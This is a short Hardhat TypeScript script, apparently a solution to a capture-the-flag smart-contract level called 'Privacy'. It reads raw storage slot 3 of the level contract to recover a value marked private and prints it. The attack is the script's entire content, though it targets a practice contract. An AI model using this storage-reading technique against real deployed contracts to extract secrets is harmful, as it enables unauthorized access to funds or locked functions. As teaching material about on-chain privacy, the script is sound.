import { ethers } from "hardhat"
import { ADDRESSES, LEVEL_ADDRESSES, PLAYER } from "../consts"
import { getSigner } from "../utils"


async function pwn() {
    const signer = await getSigner()
    const contract = await ethers.getContractAt(
        "Privacy",
        LEVEL_ADDRESSES.privacy,
        signer
    )

    //get slot3 storage item
    const storageItem = await signer?.provider?.getStorageAt(
        contract.address,
        3
    )

    console.log(storageItem)
}

pwn()